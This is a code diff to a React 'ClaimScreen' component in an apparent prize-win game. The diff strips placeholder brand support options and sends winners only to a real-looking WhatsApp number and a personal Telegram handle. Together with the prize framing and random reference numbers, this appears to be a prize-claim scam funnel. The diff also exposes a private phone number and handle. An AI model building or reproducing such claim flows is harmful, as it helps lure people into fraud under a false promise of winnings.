@@ -1,11 +1,11 @@
 import { useMemo } from "react";
 import { motion } from "motion/react";
-import { MessageCircle, Mail, Send, Phone, Headphones, RotateCcw } from "lucide-react";
+import { MessageCircle, Send, RotateCcw } from "lucide-react";
 import type { Prize } from "@/lib/prizes";
 import { makeReference } from "@/lib/prizes";
 import { Particles } from "./Particles";
 
-const WHATSAPP_NUMBER = "10000000000";
+const WHATSAPP_NUMBER = "972552491867";
 
 export function ClaimScreen({ prize, onRestart }: { prize: Prize; onRestart: () => void }) {
   const reference = useMemo(() => makeReference(), []);
@@ -23,11 +23,8 @@ export function ClaimScreen({ prize, onRestart }: { prize: Prize; onRestart: () 
   )}`;
 
   const options = [
-    { label: "WhatsApp", note: "Fastest response", icon: MessageCircle, href: waLink },
-    { label: "Live Chat", note: "Available 24/7", icon: Headphones, href: "#live-chat" },
-    { label: "Email", note: "support@novachase.example", icon: Mail, href: "mailto:support@novachase.example" },
-    { label: "Telegram", note: "@novachase", icon: Send, href: "https://t.me/novachase" },
-    { label: "Phone Support", note: "+1 (000) 000-0000", icon: Phone, href: "tel:+10000000000" },
+    { label: "WhatsApp", note: "+972 55 249 1867", icon: MessageCircle, href: waLink },
+    { label: "Telegram", note: "@Tatiana_POPOV12", icon: Send, href: "https://telegram.me/Tatiana_POPOV12" },
   ];
 
   return (
@@ -88,7 +85,7 @@ export function ClaimScreen({ prize, onRestart }: { prize: Prize; onRestart: () 
           verification and promotional terms apply.
         </p>
 
-        <div className="mt-10 grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
+        <div className="mt-10 grid gap-4 sm:grid-cols-2 max-w-lg mx-auto">
           {options.map((o, i) => (
             <motion.a
               key={o.label}
